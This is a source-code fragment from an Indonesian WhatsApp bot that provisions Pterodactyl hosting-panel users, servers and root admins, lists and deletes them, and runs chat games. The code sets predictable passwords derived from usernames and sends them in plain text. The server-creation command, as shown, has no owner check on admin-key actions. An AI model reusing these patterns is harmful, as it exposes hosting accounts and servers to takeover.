case "unli": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/8ed6c29472e8253e20495.jpg" 
if (!u) return
let d = (await qyuunee.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`
qyuunee.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: koi })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "110"
let disk = "5138"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/8ed6c29472e8253e20495.jpg" 
if (!u) return
let d = (await qyuunee.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`
qyuunee.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: koi })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
        case 'addpanel': {
             let { generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
let t = text.split(',');
if (t.length < 2) return reply(`Example: ${prefix + command} user,nomer

Use: .panel koi,6289508082844`)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: 'List Disk dan Cpu Panel',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/30 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/50 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/70 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/90 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/120 Cpu", 
id: `.5gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'Click For List', 
    sections
};

let msghhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: false, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363201331652484@newsletter',
 newsletterName: 'Koi', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: qyuunee.decodeJid(qyuunee.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `✦ Pilih Ukuran Disk Untuk Server ✦`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*${m2}[ Hallo Kak ${pushname} ]${m2}*`,
 subtitle: "Create",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/35fb6d4de12a69ab9cd4d.jpg" } }, { upload: qyuunee.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await qyuunee.relayMessage(msghhhhhhh.key.remoteJid, msghhhhhhh.message, {
 messageId: msghhhhhhh.key.id
})}
break
                case "listsrv": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await qyuunee.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr": {
  if (!isCreator) return reply(mess.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await qyuunee.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
      if (!isCreator) return reply(mess.owner)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
  if (!isCreator) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                case "addusr": {

if (!isCreator) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await qyuunee.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await qyuunee.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
│ ∘   ➤ *ID* : ${user.id}
│ ∘   ➤ *USERNAME* : ${user.username}
│ ∘   ➤ *EMAIL* : ${user.email}
│ ∘   ➤ *NAME* : ${user.first_name} ${user.last_name}
│ ∘   ➤ *CREATED AT* :  ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
╰━*PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
qyuunee.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
│ ∘   ➤ *📧EMAIL* : ${email}
│ ∘   ➤ *👤USERNAME* : ${username}
│ ∘   ➤ *🔐PASSWORD* : ${password.toString()}
│ ∘   ➤ *🌐LOGIN* : ${domain}
╰━`,
})
}
break
                case "crateadmin": {
if (!isCreator) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await qyuunee.sendMessage(m.chat, listMessage)

    await qyuunee.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadmin": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await qyuunee.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
             case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break

case "buatsws":{
if (!isCreator) return reply(mess.owner)
await loading ()
 if (!quoted) reply `Balas Sticker Dengan Caption ${prefix + command}`
if (!/webp/.test(mime)) reply `Balas sticker dengan caption *${prefix + command}*`
const media = await qyuunee.downloadAndSaveMediaMessage(quoted)
qyuunee.sendMessage('status@broadcast', { sticker: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break

/*
case 'family100': {
 if ('family100'+from in _family100) {
 reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await qyuunee.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,
 }
}
break
*/

case 'tebak': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) reply `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./database/Games/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await qyuunee.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 qyuunee.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 qyuunee.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8ed6c29472e8253e20495.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 qyuunee.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 qyuunee.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8ed6c29472e8253e20495.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 qyuunee.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 qyuunee.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8ed6c29472e8253e20495.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 qyuunee.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 qyuunee.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8ed6c29472e8253e20495.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 qyuunee.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 qyuunee.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8ed6c29472e8253e20495.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 qyuunee.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 qyuunee.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8ed6c29472e8253e20495.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break

case 'kuismath': case 'math': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math')
 if (!text) reply `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
 let result = await genMath(text.toLowerCase())
 qyuunee.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break

case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await qyuunee.sendText(room.x, str, m, { mentions: parseMention(str) } )
await qyuunee.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break

case 'delttc': case 'delttt': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) reply `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
reply(`Berhasil delete session room tictactoe !`)
}
break

case 'suitpvp': case 'suit': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
